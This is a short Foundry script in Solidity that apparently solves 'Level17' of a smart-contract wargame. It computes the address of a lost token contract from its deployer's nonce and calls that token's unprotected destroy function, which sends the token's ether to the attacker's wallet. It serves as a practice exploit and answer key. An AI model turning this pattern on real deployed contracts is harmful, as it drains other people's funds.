pragma solidity ^0.8.14;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {SimpleToken} from "../src/Level17.sol";

contract Level17Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        address token = vm.computeCreateAddress(_target, 1);
        SimpleToken(payable(token)).destroy(payable(_attacker));
    }

    function levelDone(address _target) private view returns (bool) {
        address token = vm.computeCreateAddress(_target, 1);
        return token.balance == 0;
    }
}
